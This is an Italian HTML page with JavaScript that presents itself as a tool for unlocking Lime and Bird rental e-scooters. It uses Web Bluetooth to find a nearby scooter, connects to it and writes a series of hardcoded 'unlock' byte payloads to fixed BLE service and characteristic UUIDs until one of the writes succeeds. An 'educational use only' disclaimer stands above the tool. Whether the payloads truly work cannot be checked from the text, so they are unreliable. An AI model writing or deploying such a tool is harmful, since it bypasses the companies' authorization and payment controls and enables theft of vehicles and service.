<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tool Sblocco Monopattini Lime/Bird</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        h1 {
            color: #e74c3c;
            text-align: center;
        }
        .container {
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        button {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px 0;
        }
        button:disabled {
            background: #95a5a6;
            cursor: not-allowed;
        }
        #log {
            margin-top: 20px;
            padding: 10px;
            background: #f9f9f9;
            border-radius: 5px;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
        }
        .success { color: #2ecc71; }
        .error { color: #e74c3c; }
        .warning { color: #f39c12; }
        .info { color: #3498db; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üöÄ Tool Sblocco Monopattini Lime/Bird</h1>
        <p><i>Usa con cautela. Solo per scopi educativi.</i></p>
        
        <button id="scanBtn">üîç Scansiona Dispositivi BLE</button>
        <button id="stopBtn" disabled>‚õî Ferma Scansione</button>
        
        <h3>Dispositivi Trovati:</h3>
        <div id="devices"></div>
        
        <h3>Log Attivit√†:</h3>
        <div id="log"></div>
    </div>

    <script>
        // ===== PAYLOAD PER LIME/BIRD =====
        const UNLOCK_PAYLOADS = {
            LIME: [
                new Uint8Array([0xA1, 0x01, 0x01, 0xA3]),  // Standard Lime S2/S3
                new Uint8Array([0xA1, 0x01, 0x00, 0xA2]),  // Alternativo 1
                new Uint8Array([0xA1, 0x02, 0x01, 0xA4]),  // Alternativo 2
                new Uint8Array([0xA0, 0x01, 0x01, 0xA2]),  // Vecchi modelli
            ],
            BIRD: [
                new Uint8Array([0x5A, 0x01, 0x01, 0x5C]),  // Standard Bird Zero/One
                new Uint8Array([0x5A, 0x01, 0x00, 0x5B]),  // Alternativo 1
                new Uint8Array([0x5A, 0x02, 0x01, 0x5D]),  // Alternativo 2
            ],
        };

        // ===== UUID PER LIME/BIRD =====
        const SERVICE_UUIDS = {
            LIME: "0000ffe0-0000-1000-8000-00805f9b34fb",
            BIRD: "0000ffe5-0000-1000-8000-00805f9b34fb",
        };

        const CHAR_UUIDS = {
            LIME: "0000ffe1-0000-1000-8000-00805f9b34fb",
            BIRD: "0000ffe9-0000-1000-8000-00805f9b34fb",
        };

        // ===== VARIABILI GLOBALI =====
        let scanning = false;
        let currentDevice = null;

        // ===== FUNZIONI UTILITY =====
        function logMessage(message, type = "info") {
            const logElement = document.getElementById("log");
            const entry = document.createElement("div");
            entry.className = type;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logElement.appendChild(entry);
            logElement.scrollTop = logElement.scrollHeight;
        }

        // ===== SCANSIONE DISPOSITIVI =====
        document.getElementById("scanBtn").addEventListener("click", async () => {
            if (!navigator.bluetooth) {
                logMessage("Web Bluetooth non supportato in questo browser.", "error");
                return;
            }

            scanning = true;
            document.getElementById("scanBtn").disabled = true;
            document.getElementById("stopBtn").disabled = false;
            logMessage("üîç Scansione dispositivi BLE in corso...", "info");

            try {
                const device = await navigator.bluetooth.requestDevice({
                    acceptAllDevices: true,
                    optionalServices: [SERVICE_UUIDS.LIME, SERVICE_UUIDS.BIRD]
                });

                currentDevice = device;
                logMessage(`üì± Trovato: ${device.name || "Sconosciuto"} (${device.id})`, "success");

                // Prova a connetterti e inviare i payload
                await bruteforceDevice(device);

            } catch (error) {
                logMessage(`‚ùå Errore: ${error.message}`, "error");
            } finally {
                scanning = false;
                document.getElementById("scanBtn").disabled = false;
                document.getElementById("stopBtn").disabled = true;
            }
        });

        // ===== FERMA SCANSIONE =====
        document.getElementById("stopBtn").addEventListener("click", () => {
            if (scanning) {
                logMessage("‚õî Scansione interrotta manualmente.", "warning");
                scanning = false;
                document.getElementById("scanBtn").disabled = false;
                document.getElementById("stopBtn").disabled = true;
            }
        });

        // ===== BRUTEFORCE PAYLOAD =====
        async function bruteforceDevice(device) {
            let scooterType = null;

            if (device.name && device.name.includes("Lime")) {
                scooterType = "LIME";
            } else if (device.name && device.name.includes("Bird")) {
                scooterType = "BIRD";
            }

            if (!scooterType) {
                logMessage("‚ö†Ô∏è Dispositivo non riconosciuto (n√© Lime n√© Bird).", "warning");
                return;
            }

            logMessage(`üîë Tentativo di sblocco per ${scooterType}...`, "info");

            try {
                const server = await device.gatt.connect();
                logMessage("‚úÖ Connesso al dispositivo!", "success");

                const service = await server.getPrimaryService(SERVICE_UUIDS[scooterType]);
                const characteristic = await service.getCharacteristic(CHAR_UUIDS[scooterType]);

                for (const payload of UNLOCK_PAYLOADS[scooterType]) {
                    try {
                        await characteristic.writeValue(payload);
                        logMessage(`üöÄ Payload inviato: ${Array.from(payload).map(b => b.toString(16).padStart(2, '0')).join(' ')} ‚Üí POTREBBE ESSERE SBLOCCATO!`, "success");
                        break;
                    } catch (error) {
                        logMessage(`‚ö†Ô∏è Fallito: ${error.message}`, "warning");
                    }
                }

            } catch (error) {
                logMessage(`‚ùå Errore durante la connessione: ${error.message}`, "error");
            } finally {
                if (device.gatt.connected) {
                    device.gatt.disconnect();
                    logMessage("üîå Disconnesso.", "info");
                }
            }
        }
    </script>
</body>
</html>
